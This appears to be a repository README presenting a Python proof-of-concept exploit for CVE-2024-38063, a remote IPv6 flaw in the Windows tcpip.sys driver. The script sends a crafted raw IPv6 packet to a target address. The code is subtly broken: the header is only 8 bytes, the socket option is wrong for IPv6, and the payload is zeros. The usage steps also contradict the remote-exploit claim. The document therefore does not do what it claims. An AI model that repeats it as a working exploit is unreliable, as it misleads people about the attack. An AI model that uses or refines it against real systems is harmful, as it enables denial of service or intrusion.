# IPv6 Kernel Exploit Demonstrator

## Overview

This project demonstrates a proof-of-concept (PoC) for the CVE-2024-38063 vulnerability, which affects the `tcpip.sys` kernel driver in Windows systems. This vulnerability allows remote exploitation via IPv6, potentially leading to code execution or a denial-of-service (DoS).

## Vulnerability Details

- **CVE**: CVE-2024-38063
- **Description**: A vulnerability in `tcpip.sys` affecting IPv6 processing. The issue is linked to a specific change in the kernel driver related to IPv6 packet handling.
- **CVSS Score**: 9.8

## PoC Script

The provided PoC demonstrates how to exploit this vulnerability by sending a malformed IPv6 packet to trigger the issue in a vulnerable Windows system.

### PoC Code

```python
import socket
import struct

def create_ipv6_exploit_packet():
    # Construct a malformed IPv6 packet to exploit the vulnerability
    packet = b'\x60\x00\x00\x00\x00\x00\x00\x00'  # IPv6 header
    packet += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Payload (malformed or malicious)
    return packet

def send_exploit(target_ip):
    s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    exploit_packet = create_ipv6_exploit_packet()
    s.sendto(exploit_packet, (target_ip, 0))

if __name__ == "__main__":
    target_ip = "fe80::1"  # Example target IPv6 address
    send_exploit(target_ip)

Setup

    Environment: Use a Windows 10/11 VM with the vulnerability present (pre-patch).
    Tools: Python 3.x, network tools for crafting packets.

Usage

    Run the script with administrative privileges on the target system.
    Monitor for successful exploitation or system crashes.
